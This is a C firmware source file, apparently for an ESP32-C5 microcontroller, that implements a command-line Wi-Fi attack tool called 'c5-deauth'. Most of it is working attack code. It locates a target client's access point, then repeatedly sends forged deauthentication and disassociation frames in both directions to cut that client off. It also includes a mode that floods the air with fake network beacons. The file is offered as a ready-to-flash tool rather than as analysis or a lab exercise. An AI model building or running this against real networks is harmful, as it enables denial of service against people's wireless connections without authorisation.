#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdbool.h>
#include <stdint.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_wifi.h"
#include "esp_event.h"
#include "esp_netif.h"
#include "esp_random.h"
#include "esp_timer.h"
#include "nvs_flash.h"

#define MAX_BSSIDS 8
#define MAX_FAKES 128
#define FRAME_LEN 26

static volatile bool s_attack = false;
static TaskHandle_t s_attack_task = NULL;
static uint8_t s_target[6];
static bool s_target_set = false;
static uint8_t s_bssids[MAX_BSSIDS][6];
static int s_bssid_ch[MAX_BSSIDS];
static int s_bssid_count = 0;
static int s_channel = 1;
static volatile uint32_t s_sent = 0;

static char s_fake_ssid[MAX_FAKES][33];
static uint8_t s_fake_bssid[MAX_FAKES][6];
static int s_fake_count = 0;
static volatile bool s_beacon_run = false;
static TaskHandle_t s_beacon_task = NULL;
static int s_beacon_ch = 36;
static volatile uint32_t s_beacon_sent = 0;

static esp_err_t set_band_for_channel(int channel);

static bool parse_mac(const char *s, uint8_t out[6])
{
    unsigned int v[6];
    if (sscanf(s, "%x:%x:%x:%x:%x:%x", &v[0], &v[1], &v[2], &v[3], &v[4], &v[5]) != 6) {
        return false;
    }
    for (int i = 0; i < 6; i++) {
        if (v[i] > 0xFF) {
            return false;
        }
        out[i] = (uint8_t)v[i];
    }
    return true;
}

static void wifi_init(void)
{
    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_ERROR_CHECK(nvs_flash_erase());
        ESP_ERROR_CHECK(nvs_flash_init());
    }
    ESP_ERROR_CHECK(esp_netif_init());
    ESP_ERROR_CHECK(esp_event_loop_create_default());
    esp_netif_create_default_wifi_sta();
    esp_netif_create_default_wifi_ap();

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
    ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
    ESP_ERROR_CHECK(esp_wifi_start());
    esp_wifi_set_country_code("CN", true);
    esp_wifi_set_band_mode(WIFI_BAND_MODE_AUTO);
    wifi_bandwidths_t bws = {
        .ghz_2g = WIFI_BW20,
        .ghz_5g = WIFI_BW20,
    };
    esp_wifi_set_bandwidths(WIFI_IF_STA, &bws);
    esp_wifi_set_max_tx_power(80);
}

static const char *auth_name(wifi_auth_mode_t mode)
{
    switch (mode) {
    case WIFI_AUTH_OPEN: return "OPEN";
    case WIFI_AUTH_WEP: return "WEP";
    case WIFI_AUTH_WPA_PSK: return "WPA";
    case WIFI_AUTH_WPA2_PSK: return "WPA2";
    case WIFI_AUTH_WPA_WPA2_PSK: return "WPA/WPA2";
    case WIFI_AUTH_WPA2_ENTERPRISE: return "WPA2-ENT";
    case WIFI_AUTH_WPA3_PSK: return "WPA3";
    case WIFI_AUTH_WPA2_WPA3_PSK: return "WPA2/WPA3";
    case WIFI_AUTH_WAPI_PSK: return "WAPI";
    case WIFI_AUTH_OWE: return "OWE";
    case WIFI_AUTH_WPA3_ENT_192: return "WPA3-ENT192";
    case WIFI_AUTH_DPP: return "DPP";
    case WIFI_AUTH_WPA3_ENTERPRISE: return "WPA3-ENT";
    case WIFI_AUTH_WPA2_WPA3_ENTERPRISE: return "WPA2/WPA3-ENT";
    case WIFI_AUTH_WPA_ENTERPRISE: return "WPA-ENT";
    default: return "?";
    }
}

static bool mac_eq(const uint8_t *a, const uint8_t *b)
{
    return memcmp(a, b, 6) == 0;
}

static volatile bool s_sniff_found;
static volatile bool s_sniff_enabled;
static uint8_t s_sniff_target[6];
static uint8_t s_sniff_bssid[6];
static int s_sniff_channel;

static void sniff_cb(void *buf, wifi_promiscuous_pkt_type_t type)
{
    if (!s_sniff_enabled || s_sniff_found) {
        return;
    }
    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    const uint8_t *p = pkt->payload;
    int len = pkt->rx_ctrl.sig_len;
    if (len < 24) {
        return;
    }
    uint8_t fc0 = p[0];
    uint8_t fc1 = p[1];
    uint8_t ftype = (fc0 >> 2) & 0x3;
    const uint8_t *a1 = p + 4;
    const uint8_t *a2 = p + 10;
    const uint8_t *a3 = p + 16;
    if (!mac_eq(a1, s_sniff_target) && !mac_eq(a2, s_sniff_target) && !mac_eq(a3, s_sniff_target)) {
        return;
    }
    const uint8_t *bssid = NULL;
    if (ftype == 2) {
        bool tods = fc1 & 0x01;
        bool fromds = fc1 & 0x02;
        if (tods && !fromds) {
            bssid = a1;
        } else if (!tods && fromds) {
            bssid = a2;
        } else if (!tods && !fromds) {
            bssid = a3;
        }
    } else if (ftype == 0) {
        uint8_t subtype = (fc0 >> 4) & 0xF;
        if (subtype != 4) {
            bssid = a3;
        }
    }
    if (!bssid) {
        return;
    }
    memcpy(s_sniff_bssid, bssid, 6);
    s_sniff_channel = pkt->rx_ctrl.channel;
    s_sniff_found = true;
}

static void do_findsta(const uint8_t mac[6], const uint8_t *sel, int nsel)
{
    static const uint8_t def[] = {1, 6, 11, 36, 40, 44, 48, 52, 56, 60, 64, 100, 104,
                                  108, 112, 116, 120, 124, 128, 132, 136, 140, 144,
                                  149, 153, 157, 161, 165};
    const uint8_t *chans = (sel && nsel > 0) ? sel : def;
    const int nch = (sel && nsel > 0) ? nsel : (int)(sizeof(def) / sizeof(def[0]));

    memcpy(s_sniff_target, mac, 6);
    s_sniff_found = false;

    wifi_promiscuous_filter_t filter = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_DATA | WIFI_PROMIS_FILTER_MASK_MGMT,
    };
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous_rx_cb(sniff_cb);
    esp_wifi_set_promiscuous(true);

    int cur_band = 0;
    for (int i = 0; i < nch && !s_sniff_found; i++) {
        int band = (chans[i] > 14) ? 5 : 2;
        if (band != cur_band) {
            esp_wifi_set_band_mode(band == 5 ? WIFI_BAND_MODE_5G_ONLY : WIFI_BAND_MODE_2G_ONLY);
            cur_band = band;
        }
        esp_wifi_set_channel(chans[i], WIFI_SECOND_CHAN_NONE);
        s_sniff_enabled = true;
        for (int k = 0; k < 15 && !s_sniff_found; k++) {
            vTaskDelay(pdMS_TO_TICKS(100));
        }
        s_sniff_enabled = false;
    }
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);

    if (s_sniff_found) {
        printf("STA %02X:%02X:%02X:%02X:%02X:%02X on BSSID %02X:%02X:%02X:%02X:%02X:%02X ch %d\n",
               mac[0], mac[1], mac[2], mac[3], mac[4], mac[5],
               s_sniff_bssid[0], s_sniff_bssid[1], s_sniff_bssid[2],
               s_sniff_bssid[3], s_sniff_bssid[4], s_sniff_bssid[5],
               s_sniff_channel);
    } else {
        printf("STA not seen\n");
    }
    set_band_for_channel(s_channel);
    esp_wifi_set_channel(s_channel, WIFI_SECOND_CHAN_NONE);
}

static volatile bool s_rsn_found;
static volatile bool s_rsn_enabled;
static uint8_t s_rsn_bssid[6];

static void rsn_cb(void *buf, wifi_promiscuous_pkt_type_t type)
{
    if (!s_rsn_enabled || s_rsn_found || type != WIFI_PKT_MGMT) {
        return;
    }
    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    const uint8_t *p = pkt->payload;
    int len = pkt->rx_ctrl.sig_len;
    if (len < 38) {
        return;
    }
    uint8_t fc0 = p[0];
    if (((fc0 >> 4) & 0xF) != 8) {
        return;
    }
    const uint8_t *bssid = p + 16;
    if (!mac_eq(bssid, s_rsn_bssid)) {
        return;
    }
    int pos = 36;
    while (pos + 2 <= len) {
        uint8_t id = p[pos];
        uint8_t elen = p[pos + 1];
        if (pos + 2 + elen > len) {
            break;
        }
        if (id == 48) {
            const uint8_t *ie = p + pos + 2;
            int n = elen;
            int i = 6;
            if (i + 2 > n) {
                return;
            }
            int pc = ie[i] | (ie[i + 1] << 8);
            i += 2 + 4 * pc;
            if (i + 2 > n) {
                return;
            }
            int ac = ie[i] | (ie[i + 1] << 8);
            i += 2;
            printf("RSN %02X:%02X:%02X:%02X:%02X:%02X akm",
                   bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
            for (int k = 0; k < ac && i + 4 <= n; k++, i += 4) {
                printf(" %02X", ie[i + 3]);
            }
            if (i + 2 <= n) {
                uint16_t caps = ie[i] | (ie[i + 1] << 8);
                printf(" caps=0x%04X MFPC=%d MFPR=%d", caps, (caps >> 7) & 1, (caps >> 6) & 1);
            }
            printf("\n");
            s_rsn_found = true;
            return;
        }
        pos += 2 + elen;
    }
}

static void do_rsn(const uint8_t bssid[6])
{
    memcpy(s_rsn_bssid, bssid, 6);
    s_rsn_found = false;
    esp_wifi_set_band_mode(s_channel > 14 ? WIFI_BAND_MODE_5G_ONLY : WIFI_BAND_MODE_2G_ONLY);
    esp_wifi_set_channel(s_channel, WIFI_SECOND_CHAN_NONE);

    wifi_promiscuous_filter_t filter = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT,
    };
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous_rx_cb(rsn_cb);
    esp_wifi_set_promiscuous(true);
    s_rsn_enabled = true;
    for (int k = 0; k < 40 && !s_rsn_found; k++) {
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    s_rsn_enabled = false;
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);
    if (!s_rsn_found) {
        printf("no beacon from %02X:%02X:%02X:%02X:%02X:%02X on ch %d\n",
               bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], s_channel);
    }
}

static int build_beacon(uint8_t *f, const uint8_t bssid[6], const char *ssid, int ch, uint16_t seq)
{
    static const uint8_t rates_2g[8] = {0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24};
    static const uint8_t rates_5g[8] = {0x8C, 0x12, 0x98, 0x24, 0xB0, 0x48, 0x60, 0x6C};
    const uint8_t *rates = (ch > 14) ? rates_5g : rates_2g;
    int n = 0;

    f[n++] = 0x80;              // beacon
    f[n++] = 0x00;
    f[n++] = 0x00;              // duration
    f[n++] = 0x00;
    memset(f + n, 0xFF, 6);     // DA: broadcast
    n += 6;
    memcpy(f + n, bssid, 6);    // SA
    n += 6;
    memcpy(f + n, bssid, 6);    // BSSID
    n += 6;
    f[n++] = seq & 0xFF;
    f[n++] = seq >> 8;

    memset(f + n, 0, 8);        // timestamp
    n += 8;
    f[n++] = 0x64;              // beacon interval 100 TU
    f[n++] = 0x00;
    f[n++] = 0x11;              // capability: ESS + short preamble/slot
    f[n++] = 0x04;

    int slen = (int)strlen(ssid);
    if (slen > 32) {
        slen = 32;
    }
    f[n++] = 0;                 // SSID IE
    f[n++] = (uint8_t)slen;
    memcpy(f + n, ssid, slen);
    n += slen;

    f[n++] = 1;                 // supported rates
    f[n++] = 8;
    memcpy(f + n, rates, 8);
    n += 8;

    f[n++] = 3;                 // DS parameter: channel
    f[n++] = 1;
    f[n++] = (uint8_t)ch;

    static const uint8_t ht_cap[26] = {
        0x0C, 0x00, 0x1B,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00,
        0x00, 0x00, 0x00, 0x00,
        0x00,
    };
    f[n++] = 45;                // HT capabilities
    f[n++] = 26;
    memcpy(f + n, ht_cap, 26);
    n += 26;

    static const uint8_t vht_cap[12] = {
        0x0F, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    };
    f[n++] = 191;               // VHT capabilities
    f[n++] = 12;
    memcpy(f + n, vht_cap, 12);
    n += 12;

    f[n++] = 192;               // VHT operation: 20/40 MHz
    f[n++] = 5;
    f[n++] = 0x00;
    f[n++] = 0x00;
    f[n++] = 0x00;
    f[n++] = 0x00;
    f[n++] = 0x00;

    return n;
}

static void beacon_task(void *arg)
{
    uint8_t frame[192];
    uint16_t seq = 0;
    uint32_t last = esp_timer_get_time() / 1000;

    while (s_beacon_run) {
        for (int i = 0; i < s_fake_count; i++) {
            int len = build_beacon(frame, s_fake_bssid[i], s_fake_ssid[i], s_beacon_ch, seq++);
            esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, frame, len, false);
            if (err == ESP_OK) {
                s_beacon_sent++;
            } else if (err == ESP_ERR_NO_MEM) {
                vTaskDelay(pdMS_TO_TICKS(5));
            }
            if (s_fake_count > 16) {
                vTaskDelay(pdMS_TO_TICKS(15));
            }
        }
        vTaskDelay(pdMS_TO_TICKS(s_fake_count > 16 ? 0 : 100));

        uint32_t now = esp_timer_get_time() / 1000;
        if (now - last >= 5000) {
            printf("beacons %lu pps, %d ssids on ch %d\n",
                   (unsigned long)(s_beacon_sent / 5), s_fake_count, s_beacon_ch);
            s_beacon_sent = 0;
            last = now;
        }
    }
    printf("beacons stopped\n");
    s_beacon_task = NULL;
    vTaskDelete(NULL);
}

static void restore_sta_mode(void)
{
    esp_wifi_stop();
    esp_wifi_set_mode(WIFI_MODE_STA);
    esp_wifi_start();
    esp_wifi_set_country_code("CN", true);
    wifi_bandwidths_t bws = {
        .ghz_2g = WIFI_BW20,
        .ghz_5g = WIFI_BW20,
    };
    esp_wifi_set_bandwidths(WIFI_IF_STA, &bws);
    esp_wifi_set_max_tx_power(80);
}

static void stop_beacons(void)
{
    if (!s_beacon_run) {
        printf("beacons not running\n");
        return;
    }
    s_beacon_run = false;
    vTaskDelay(pdMS_TO_TICKS(300));
    restore_sta_mode();
    printf("beacons stopped, STA restored\n");
}

static void start_beacons(char *list)
{
    if (s_attack) {
        printf("stop attack first\n");
        return;
    }
    if (s_beacon_run) {
        printf("beacons already running; stopbeacons first\n");
        return;
    }

    s_fake_count = 0;
    int auto_count = 0;
    if (sscanf(list, "auto %d", &auto_count) == 1 && auto_count > 0) {
        if (auto_count > MAX_FAKES) {
            auto_count = MAX_FAKES;
        }
        for (int i = 0; i < auto_count; i++) {
            snprintf(s_fake_ssid[i], sizeof(s_fake_ssid[i]), "5G-Test-%d", i + 1);
            uint8_t b[6] = {0x00, 0x11, 0x22, 0x33, 0x44, (uint8_t)(i + 1)};
            memcpy(s_fake_bssid[i], b, 6);
        }
        s_fake_count = auto_count;
    } else {
        char *save = NULL;
        for (char *tok = strtok_r(list, ",", &save); tok && s_fake_count < MAX_FAKES;
             tok = strtok_r(NULL, ",", &save)) {
            while (*tok == ' ') {
                tok++;
            }
            int len = (int)strlen(tok);
            while (len > 0 && (tok[len - 1] == ' ' || tok[len - 1] == '\r' || tok[len - 1] == '\n')) {
                tok[--len] = '\0';
            }
            if (len == 0) {
                continue;
            }
            if (len > 32) {
                len = 32;
            }
            memcpy(s_fake_ssid[s_fake_count], tok, len);
            s_fake_ssid[s_fake_count][len] = '\0';
            uint8_t b[6] = {0x00, 0x11, 0x22, 0x33, 0x44, (uint8_t)(s_fake_count + 1)};
            memcpy(s_fake_bssid[s_fake_count], b, 6);
            s_fake_count++;
        }
    }

    if (s_fake_count == 0) {
        printf("usage: beaconspam ssid1,ssid2,... | beaconspam auto <n>\n");
        return;
    }

    printf("WARNING: beacon spam is experimental; injected beacons may not transmit on ESP32-C5.\n");

    s_beacon_ch = s_channel;
    if (s_beacon_ch <= 0) {
        s_beacon_ch = 36;
    }

    esp_wifi_stop();
    esp_err_t err = esp_wifi_set_mode(WIFI_MODE_AP);
    if (err != ESP_OK) {
        printf("AP mode failed: %s\n", esp_err_to_name(err));
        restore_sta_mode();
        return;
    }

    wifi_config_t ap_cfg = {0};
    memcpy(ap_cfg.ap.ssid, "cfg", 3);
    ap_cfg.ap.ssid_len = 3;
    ap_cfg.ap.channel = (uint8_t)s_beacon_ch;
    ap_cfg.ap.authmode = WIFI_AUTH_OPEN;
    ap_cfg.ap.max_connection = 1;
    ap_cfg.ap.ssid_hidden = 1;
    ap_cfg.ap.beacon_interval = 100;

    err = esp_wifi_set_config(WIFI_IF_AP, &ap_cfg);
    if (err == ESP_OK) {
        err = esp_wifi_start();
    }
    if (err != ESP_OK) {
        printf("AP beacon setup failed: %s\n", esp_err_to_name(err));
        restore_sta_mode();
        return;
    }

    esp_wifi_set_channel(s_beacon_ch, WIFI_SECOND_CHAN_NONE);

    s_beacon_sent = 0;
    s_beacon_run = true;
    xTaskCreate(beacon_task, "beacon", 4096, NULL, 3, &s_beacon_task);

    printf("beacon spam (AP iface) on ch %d: ", s_beacon_ch);
    for (int i = 0; i < s_fake_count; i++) {
        printf("%s%s", i ? "," : "", s_fake_ssid[i]);
    }
    printf("\n");
}

static void do_scan(void)
{
    if (s_attack) {
        printf("stop attack first\n");
        return;
    }
    if (s_beacon_run) {
        printf("stop beacons first\n");
        return;
    }
    wifi_scan_config_t sc = {0};
    sc.show_hidden = true;
    sc.scan_type = WIFI_SCAN_TYPE_ACTIVE;

    esp_wifi_set_band_mode(WIFI_BAND_MODE_AUTO);
    esp_err_t err = esp_wifi_scan_start(&sc, true);
    if (err != ESP_OK) {
        printf("scan failed: %s\n", esp_err_to_name(err));
        return;
    }
    uint16_t n = 0;
    esp_wifi_scan_get_ap_num(&n);
    if (n > 40) {
        n = 40;
    }
    wifi_ap_record_t *recs = calloc(n ? n : 1, sizeof(wifi_ap_record_t));
    if (!recs) {
        printf("oom\n");
        return;
    }
    uint16_t got = n;
    err = esp_wifi_scan_get_ap_records(&got, recs);
    if (err != ESP_OK) {
        printf("get scan failed: %s\n", esp_err_to_name(err));
        free(recs);
        return;
    }
    printf("found %u APs\n", (unsigned)got);
    for (int i = 0; i < got; i++) {
        printf("%2d ch=%3d rssi=%4d %-10s %02X:%02X:%02X:%02X:%02X:%02X  %s\n",
               i, recs[i].primary, recs[i].rssi, auth_name(recs[i].authmode),
               recs[i].bssid[0], recs[i].bssid[1], recs[i].bssid[2],
               recs[i].bssid[3], recs[i].bssid[4], recs[i].bssid[5],
               (char *)recs[i].ssid);
    }
    free(recs);
}

static void send_one(const uint8_t *frame)
{
    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, frame, FRAME_LEN, false);
    if (err == ESP_OK) {
        s_sent++;
    } else if (err == ESP_ERR_NO_MEM || err == ESP_ERR_TIMEOUT) {
        vTaskDelay(1);
    }
}

static void send_burst(const uint8_t bssid[6], const uint8_t mac[6])
{
    uint8_t deauth[FRAME_LEN] = {0xC0, 0x00, 0x3A, 0x01};
    uint8_t disassoc[FRAME_LEN] = {0xA0, 0x00, 0x3A, 0x01};
    uint16_t seq = (esp_random() & 0xFFF) << 4;

    // AP -> STA
    memcpy(&deauth[4], mac, 6);
    memcpy(&deauth[10], bssid, 6);
    memcpy(&deauth[16], bssid, 6);
    deauth[22] = seq & 0xFF;
    deauth[23] = seq >> 8;
    deauth[24] = 0x07;
    deauth[25] = 0x00;

    memcpy(&disassoc[4], mac, 6);
    memcpy(&disassoc[10], bssid, 6);
    memcpy(&disassoc[16], bssid, 6);
    disassoc[22] = seq & 0xFF;
    disassoc[23] = seq >> 8;
    disassoc[24] = 0x08;
    disassoc[25] = 0x00;

    for (int i = 0; i < 2; i++) {
        send_one(deauth);
        send_one(disassoc);
    }

    // STA -> AP
    memcpy(&deauth[4], bssid, 6);
    memcpy(&deauth[10], mac, 6);
    memcpy(&disassoc[4], bssid, 6);
    memcpy(&disassoc[10], mac, 6);

    for (int i = 0; i < 2; i++) {
        send_one(deauth);
        send_one(disassoc);
    }
}

static esp_err_t set_band_for_channel(int channel)
{
    wifi_band_mode_t mode = (channel > 14) ? WIFI_BAND_MODE_5G_ONLY : WIFI_BAND_MODE_2G_ONLY;
    return esp_wifi_set_band_mode(mode);
}

static void attack_task(void *arg)
{
    printf("ATTACK target %02X:%02X:%02X:%02X:%02X:%02X ch %d bssids %d\n",
           s_target[0], s_target[1], s_target[2], s_target[3], s_target[4], s_target[5],
           s_channel, s_bssid_count);

    esp_err_t berr = set_band_for_channel(s_channel);
    if (berr != ESP_OK) {
        printf("band switch failed: %s\n", esp_err_to_name(berr));
    }

    uint32_t last = esp_timer_get_time() / 1000;
    bool ch_reported = false;
    int cur_band = 0;
    while (s_attack) {
        for (int b = 0; b < s_bssid_count; b++) {
            int ch = s_bssid_ch[b];
            int band = (ch > 14) ? 5 : 2;
            if (band != cur_band) {
                esp_err_t berr2 = set_band_for_channel(ch);
                if (berr2 != ESP_OK && !ch_reported) {
                    printf("band switch failed: %s\n", esp_err_to_name(berr2));
                    ch_reported = true;
                }
                cur_band = band;
            }
            esp_err_t cerr = esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
            if (cerr != ESP_OK && !ch_reported) {
                printf("set ch %d failed: %s\n", ch, esp_err_to_name(cerr));
                ch_reported = true;
            }
            for (int burst = 0; burst < 5; burst++) {
                send_burst(s_bssids[b], s_target);
                vTaskDelay(1);
            }
        }
        vTaskDelay(pdMS_TO_TICKS(2));
        uint32_t now = esp_timer_get_time() / 1000;
        if (now - last >= 5000) {
            printf("%lu pps\n", (unsigned long)(s_sent / 5));
            s_sent = 0;
            last = now;
        }
    }
    printf("attack stopped\n");
    s_attack_task = NULL;
    vTaskDelete(NULL);
}

static void print_help(void)
{
    printf("commands:\n");
    printf("  scan                 scan APs (2.4G + 5G)\n");
    printf("  findsta <mac> [ch..] find client's AP BSSID/channel (optional channels)\n");
    printf("  rsn <bssid>          read the AP's RSN/PMF capabilities\n");
    printf("  target <mac>         set client MAC\n");
    printf("  bssid <mac> [ch]     add AP BSSID with optional channel\n");
    printf("  clear                clear BSSID list\n");
    printf("  ch <channel>         set channel (1-13, 36-165)\n");
    printf("  beaconspam <ssid,..> experimental (may not transmit on C5)\n");
    printf("  beaconspam auto <n>  experimental; generate n fake SSIDs\n");
    printf("  stopbeacons          stop fake SSID beacons\n");
    printf("  start / stop         start or stop deauth\n");
    printf("  status               show config\n");
}

static int read_line(char *buf, int cap)
{
    int n = 0;
    while (1) {
        int ch = fgetc(stdin);
        if (ch == EOF) {
            vTaskDelay(pdMS_TO_TICKS(20));
            continue;
        }
        if (ch == '\r' || ch == '\n') {
            printf("\n");
            break;
        }
        if (ch == 0x7f || ch == 0x08) {
            if (n > 0) {
                n--;
                printf("\b \b");
            }
            continue;
        }
        if (n < cap - 1) {
            buf[n++] = (char)ch;
            putchar(ch);
        }
    }
    buf[n] = '\0';
    return n;
}

static void cli_task(void *arg)
{
    char line[320];
    printf("\nc5-deauth ready\n");
    print_help();
    printf("c5> ");
    fflush(stdout);

    while (1) {
        if (read_line(line, sizeof(line)) == 0) {
            printf("c5> ");
            fflush(stdout);
            continue;
        }
        char *p = line;
        while (*p == ' ') {
            p++;
        }

        if (!strncmp(p, "help", 4)) {
            print_help();
        } else if (!strncmp(p, "scan", 4)) {
            do_scan();
        } else if (!strncmp(p, "findsta ", 8)) {
            if (s_attack) {
                printf("stop attack first\n");
            } else if (s_beacon_run) {
                printf("stop beacons first\n");
            } else {
                char macbuf[32] = {0};
                char chbuf[64] = {0};
                int n = sscanf(p + 8, "%31s %63s", macbuf, chbuf);
                uint8_t mac[6];
                if (n >= 1 && parse_mac(macbuf, mac)) {
                    uint8_t sel[16];
                    int nsel = 0;
                    if (n >= 2) {
                        char *cp = chbuf;
                        while (cp && *cp && nsel < 16) {
                            char *end = NULL;
                            long v = strtol(cp, &end, 10);
                            if (end == cp) {
                                break;
                            }
                            if (v > 0 && v < 200) {
                                sel[nsel++] = (uint8_t)v;
                            }
                            cp = (*end == ',') ? end + 1 : NULL;
                        }
                    }
                    do_findsta(mac, nsel ? sel : NULL, nsel);
                } else {
                    printf("bad mac\n");
                }
            }
        } else if (!strncmp(p, "rsn ", 4)) {
            if (s_attack) {
                printf("stop attack first\n");
            } else if (s_beacon_run) {
                printf("stop beacons first\n");
            } else {
                uint8_t mac[6];
                if (parse_mac(p + 4, mac)) {
                    do_rsn(mac);
                } else {
                    printf("bad mac\n");
                }
            }
        } else if (!strncmp(p, "target ", 7)) {
            if (parse_mac(p + 7, s_target)) {
                s_target_set = true;
                printf("target set\n");
            } else {
                printf("bad mac\n");
            }
        } else if (!strncmp(p, "bssid ", 6)) {
            if (s_bssid_count >= MAX_BSSIDS) {
                printf("bssid list full\n");
            } else {
                char macbuf[32];
                int ch = s_channel;
                int n = sscanf(p + 6, "%31s %d", macbuf, &ch);
                if (n >= 1 && parse_mac(macbuf, s_bssids[s_bssid_count])) {
                    s_bssid_ch[s_bssid_count] = (n >= 2 && ch > 0) ? ch : s_channel;
                    s_bssid_count++;
                    printf("bssid added (%d) ch %d\n", s_bssid_count, s_bssid_ch[s_bssid_count - 1]);
                } else {
                    printf("bad mac\n");
                }
            }
        } else if (!strncmp(p, "clear", 5)) {
            s_bssid_count = 0;
            printf("cleared\n");
        } else if (!strncmp(p, "ch ", 3)) {
            if (s_attack) {
                printf("stop attack first\n");
            } else if (s_beacon_run) {
                printf("stop beacons first\n");
            } else {
                s_channel = atoi(p + 3);
                printf("ch %d\n", s_channel);
                esp_err_t err = set_band_for_channel(s_channel);
                if (err != ESP_OK) {
                    printf("band switch failed: %s\n", esp_err_to_name(err));
                }
            }
        } else if (!strncmp(p, "beaconspam ", 11)) {
            start_beacons(p + 11);
        } else if (!strncmp(p, "stopbeacons", 11)) {
            stop_beacons();
        } else if (!strncmp(p, "start", 5)) {
            if (!s_target_set || s_bssid_count == 0) {
                printf("set target and at least one bssid first\n");
            } else if (s_attack) {
                printf("already running\n");
            } else if (s_beacon_run) {
                printf("stop beacons first\n");
            } else {
                s_attack = true;
                xTaskCreate(attack_task, "attack", 4096, NULL, 5, &s_attack_task);
            }
        } else if (!strncmp(p, "stop", 4)) {
            s_attack = false;
            printf("stopping\n");
        } else if (!strncmp(p, "status", 6)) {
            printf("target %02X:%02X:%02X:%02X:%02X:%02X, bssids %d, ch %d, running %d\n",
                   s_target[0], s_target[1], s_target[2], s_target[3], s_target[4], s_target[5],
                   s_bssid_count, s_channel, s_attack);
            printf("beacons running %d, ssids %d, ch %d\n",
                   s_beacon_run, s_fake_count, s_beacon_ch);
        } else {
            printf("unknown command; type help\n");
        }
        printf("c5> ");
        fflush(stdout);
    }
}

void app_main(void)
{
    wifi_init();
    xTaskCreate(cli_task, "cli", 4096, NULL, 5, NULL);
}
